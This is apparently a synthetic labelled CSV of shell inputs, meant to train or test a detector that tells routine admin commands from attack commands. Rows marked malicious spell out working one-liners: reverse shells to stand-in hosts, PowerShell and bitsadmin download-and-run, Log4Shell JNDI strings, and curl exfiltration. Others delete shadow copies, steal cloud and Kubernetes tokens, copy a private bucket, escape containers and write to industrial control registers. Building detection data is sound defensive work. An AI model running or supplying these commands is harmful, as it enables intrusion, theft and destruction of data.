timestamp,src_ip,input,label
2026-01-20T17:46:38.752911,42.250.218.84,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.721658,205.245.103.42,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.735167,6.42.19.43,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.691848,176.26.45.117,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.701356,55.20.239.15,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.704359,54.81.196.83,npm start,Normal_Business_Ops
2026-01-20T17:46:38.719124,3.196.167.125,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.744361,190.119.59.13,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.742361,78.21.156.228,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.719124,187.207.28.120,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.726165,98.93.229.8,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.690278,184.96.68.147,git pull,Normal_Business_Ops
2026-01-20T17:46:38.722168,18.200.48.60,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.720628,55.204.92.91,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.740386,152.156.102.251,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.724165,147.29.61.235,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.686752,222.83.191.242,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.743361,42.255.130.135,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.734167,190.8.83.172,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.755771,118.33.246.134,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.685785,95.125.172.116,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.701356,37.152.28.38,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.712423,47.222.255.84,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.745361,125.60.58.227,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.751920,128.167.67.102,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.697356,154.238.25.228,whoami,Normal_Business_Ops
2026-01-20T17:46:38.715600,83.195.133.127,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.714423,104.48.197.157,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.750363,79.112.203.245,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.737194,135.226.236.213,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.744361,179.204.245.16,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.700357,161.98.20.222,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.719650,102.210.127.139,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.685785,186.137.91.111,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.703359,25.24.163.236,whoami,Normal_Business_Ops
2026-01-20T17:46:38.751920,223.123.70.67,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.686752,189.191.248.59,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.712423,36.183.94.165,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.735167,137.247.99.171,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.713423,75.113.70.153,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.690278,15.248.183.12,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.708422,112.248.214.236,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.688752,123.105.133.165,git pull,Normal_Business_Ops
2026-01-20T17:46:38.697356,202.33.2.201,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.739701,111.236.149.229,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.737706,54.62.93.120,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.753424,82.0.109.88,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.707462,35.163.215.228,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.698355,9.74.229.213,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.716597,24.190.191.33,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.696355,208.154.134.173,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.723165,31.138.165.159,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.704359,122.111.135.247,git add .,Normal_Business_Ops
2026-01-20T17:46:38.716597,116.159.78.40,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.754419,116.183.215.248,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.701356,115.37.77.8,uptime,Normal_Business_Ops
2026-01-20T17:46:38.711422,164.208.66.40,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.747362,70.20.91.178,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.716597,146.173.63.56,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.708422,75.82.151.59,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.715600,195.4.237.74,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.719650,67.97.78.78,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.733168,61.183.134.72,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.719650,201.102.122.57,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.706916,173.24.42.18,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.731167,69.177.231.200,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.695355,50.209.104.4,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.722168,30.32.115.20,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.727166,162.183.162.253,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.738701,177.254.155.220,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.755771,172.187.63.60,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.684749,55.217.104.247,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.695355,167.97.147.75,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.745361,143.96.35.40,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.683749,144.166.224.254,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.736168,148.184.195.30,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.697356,186.19.170.105,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.742361,23.222.186.252,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.688752,20.229.43.194,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.708422,210.68.40.51,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.737194,124.54.84.24,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.719650,3.142.90.15,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.727166,28.187.42.56,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.688752,79.213.198.69,sudo systemctl restart nginx,Normal_Business_Ops
